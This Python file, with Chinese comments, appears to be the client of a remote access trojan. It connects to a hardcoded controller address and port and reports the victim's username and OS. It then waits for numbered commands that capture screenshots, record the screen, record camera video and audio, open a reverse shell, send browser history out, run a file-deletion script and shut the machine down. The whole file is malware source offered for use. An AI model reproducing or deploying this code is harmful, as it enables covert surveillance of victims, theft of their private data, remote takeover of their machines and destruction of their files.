import socket
import subprocess
import platform
from getpass import getuser
from screenshot import screenshot
from camera_record import record_video_with_audio
from reverse_shell import handle_reverse_shell
from screen_recording import record_screen
from web_history import extract_and_send_history  # Import the function

def execute_script(script_name):
    """執行給定的腳本。"""
    try:
        result = subprocess.run(['python', script_name], check=True, text=True, capture_output=True)
        print(f"腳本輸出: {result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"腳本執行失敗，錯誤: {e.stderr}")

def client_program():
    get_os = platform.uname()[0]
    get_user = getuser()
    os_info = f"client_name : {get_user} <-> client_os : {get_os}"

    # host = '192.168.116.132'
    # host = '127.0.0.1'
    host = '192.168.0.167'
    port = 50002

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    client_socket.send(os_info.encode())

    while True:
        message = client_socket.recv(1024).decode()  # 接收服務器消息
        if message == '1':
            num_screenshots = int(client_socket.recv(1024).decode())  # 接收截圖數量
            screenshot(client_socket, num_screenshots)
        elif message == '2':
            duration = 10  # 錄製的持續時間
            record_screen(duration=duration, client_socket=client_socket)  # 錄製並發送文件
        elif message == '3':
            record_video_with_audio(client_socket, duration=10)  # 錄製 10 秒的音視頻
        elif message == '4':
            handle_reverse_shell(client_socket)  # 處理反向 shell
        elif message == '5':
            extract_and_send_history(client_socket)  # 提取並發送瀏覽歷史記錄
        elif message == '6':
            execute_script('file_delete.py')
        elif message == '7':
            execute_script('close.py')  # 執行關機腳本

    client_socket.close()

if __name__ == '__main__':
    client_program()
